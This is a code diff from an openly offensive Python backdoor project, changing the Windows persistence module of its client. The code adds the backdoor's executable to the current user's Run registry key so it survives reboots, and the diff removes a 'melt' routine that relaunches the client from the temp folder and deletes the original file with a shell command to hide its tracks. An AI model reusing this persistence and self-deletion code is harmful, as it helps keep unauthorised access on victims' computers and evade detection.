@@ -9,9 +9,7 @@ license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 import ctypes
 import os
 import shutil
-import subprocess
 import sys
-import tempfile
 import winreg
 
 import wmi
@@ -40,7 +38,8 @@ class Windows(Persistence):
 
     def remove_from_startup(self):
         try:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+                                 winreg.KEY_ALL_ACCESS)
             winreg.DeleteValue(key, REG_STARTUP_NAME)
             winreg.CloseKey(key)
         except FileNotFoundError:
@@ -54,6 +53,9 @@ class Windows(Persistence):
         if curr_file.endswith(".py"):
             raise errors.ClientSocket.Persistence.StartupError("Client must be built with pyinstaller for this feature")
 
+        # get actual .exe
+        curr_file = os.path.realpath(sys.executable)
+
         try:
             app_path = os.path.join(COPY_LOCATION, os.path.basename(curr_file))
 
@@ -63,31 +65,9 @@ class Windows(Persistence):
                 except Exception as e:
                     raise WindowsError(e)
 
-            regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
+            regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+                                    winreg.KEY_ALL_ACCESS)
             winreg.SetValueEx(regkey, REG_STARTUP_NAME, 0, winreg.REG_SZ, f"\"{app_path}\"")
             winreg.CloseKey(regkey)
         except WindowsError as e:
             raise errors.ClientSocket.Persistence.StartupError(f"Unable to add to startup {e}")
-
-    def melt(self):
-        curr_file = os.path.realpath(sys.argv[0])
-
-        # ignore melting if client has not been built
-        if curr_file.endswith(".py"):
-            return
-
-        tmp = os.path.normpath(tempfile.gettempdir()).lower()
-
-        curr_file_dir = os.path.normpath(os.path.dirname(curr_file)).lower()
-
-        if tmp != curr_file_dir:
-            new_file = os.path.join(tmp, os.path.basename(curr_file))
-            # if there is a problem copying file, abort melting
-            try:
-                shutil.copyfile(curr_file, new_file)
-            except IOError:
-                return
-
-            os.startfile(new_file)
-            subprocess.Popen(f"timeout 4 & del -f {curr_file}", shell=True)
-            sys.exit(0)
